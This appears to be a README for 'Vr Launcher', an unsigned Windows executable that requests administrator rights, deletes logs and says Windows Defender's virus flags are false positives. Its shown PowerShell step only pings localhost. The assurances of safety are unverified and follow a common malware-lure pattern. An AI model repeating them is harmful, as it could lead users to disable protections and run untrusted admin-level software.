# Vr-Launcher- 🚀

Have you ever wanted less resource usage when playing VR alongside some helpful debugging tools? Well, you came to the right place! Welcome to **Vr Launcher**.

---

## 🛠️ Core Features

* **Built with Visual Studio 2026** – Modern and optimized.
* **Low RAM Footprint** – Keeps usage minimal (at least 40 MB saved!) so your PC can focus on the VR game.
* **Discord Rich Presence** – Let your friends see what you are up to (Displays: *Playing: Vr Launcher*).
* **Automatic Log Cleaner** – Automatically wipes unnecessary logs to reclaim your disk space.
* **Auto-Killer on Crash** – Cleanly shuts down if an unexpected error occurs so it doesn't hang in the background.
* **Optimized Performance** – Lightweight and snappy.

---

## ℹ️ Important Info
I am a solo developer working on this project! I will actively take feedback and do my absolute best to fix issues as they pop up. Hope you enjoy the app and have a wonderful day, VR players! 👋

---

## 📦 Install Guide

1. Download the release `.zip` file.
2. Extract the ZIP file completely into its own folder.
3. Open `Vr Launcher.exe` (Run this file **only**).
4. You're all set. Have fun!

### 🔍 Troubleshooting & Notices

* **Windows Says It's a Virus:** It is completely safe! Because this is an unsigned indie utility, Windows Defender might flag a false positive. This is usually triggered by the essential `.dll` files in the folder or the administrative checks. 
* **Admin Privileges:** The app requests Administrator permissions because it runs system diagnostics (like checking your C: drive space) and clears out junk log files to save you storage.
* **⚠️ Strict Notice:** Please read the included `README` and `COPYRIGHT NOTICE` files before publishing any videos or media showcasing the app. **Do not modify or delete any files inside the folder.**
* **Stuck On Waiting For Port 9999** Open Windows Terminal And Paste This In: $client = New-Object System.Net.Sockets.UdpClient; $bytes = [Text.Encoding]::ASCII.GetBytes("PING"); $client.Send($bytes, $bytes.Length, "127.0.0.1", 9999); $client.Close() This Skips It And Contiunes.

---

## 🔴 Prerequisites
Make sure you have the **.NET 10 Desktop Runtime** installed on your PC before launching the app:
👉 [Download .NET 10 Desktop Runtime](https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-10.0.9-windows-x64-installer)
